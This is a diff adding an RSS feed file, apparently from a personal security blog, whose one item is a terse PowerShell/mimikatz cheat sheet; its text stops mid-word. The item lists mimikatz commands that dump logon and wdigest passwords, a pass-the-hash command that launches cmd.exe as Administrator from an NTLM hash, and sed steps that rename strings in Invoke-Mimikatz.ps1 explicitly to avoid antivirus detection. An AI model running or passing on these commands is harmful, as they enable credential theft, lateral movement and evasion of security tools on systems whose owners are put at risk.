@@ -1,0 +1,31 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Powershell on BLACKVOLGA</title>
+    <link>https://blackvolga.github.io/tags/powershell/</link>
+    <description>Recent content in Powershell on BLACKVOLGA</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <managingEditor>blackvolga@pm.me (GAZ23)</managingEditor>
+    <webMaster>blackvolga@pm.me (GAZ23)</webMaster>
+    <lastBuildDate>Tue, 03 Oct 2017 00:00:00 +0000</lastBuildDate>
+    
+	<atom:link href="https://blackvolga.github.io/tags/powershell/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>powershell</title>
+      <link>https://blackvolga.github.io/intel/powershell/</link>
+      <pubDate>Tue, 03 Oct 2017 00:00:00 +0000</pubDate>
+      <author>blackvolga@pm.me (GAZ23)</author>
+      <guid>https://blackvolga.github.io/intel/powershell/</guid>
+      <description>https://github.com/gentilkiwi/mimikatz
+https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
+TLDR: 1.\mimikatz &amp;#34;privilege::debug&amp;#34; &amp;#34;sekurlsa::logonpasswords&amp;#34; exit
+extract passwds
+1mimikatz_command -f sekurlsa::logonPasswords full 2mimikatz_command -f sekurlsa::wdigest pass the hash (on the left hand side)
+1sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe mimidawgz (avoid AV detection)
+1mv Invoke-Mimikatz.ps1 Invoke-MimiDawgz.ps1 2 3sed -i -e &amp;#39;s/Invoke-Mimikatz/Invoke-Mimidawgz/g&amp;#39; Invoke-MimiDawgz.ps1 4sed -i -e &amp;#39;/&amp;lt;#/,/#&amp;gt;/c\\&amp;#39; Invoke-MimiDawgz.ps1 5 6sed -i -e &amp;#39;s/^[[:space:]]*#.*$//g&amp;#39; Invoke-MimiDawgz.ps1 7 8sed -i -e &amp;#39;s/DumpCreds/DumpCred/g&amp;#39; Invoke-MimiDawgz.ps1 9 10sed -i -e &amp;#39;s/ArgumentPtr/NotTodayPal/g&amp;#39; Invoke-MimiDawgz.ps1 11 12sed -i -e &amp;#39;s/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g&amp;#39; 13Invoke-MimiDawgz.</description>
+    </item>
+    
+  </channel>
+</rss>
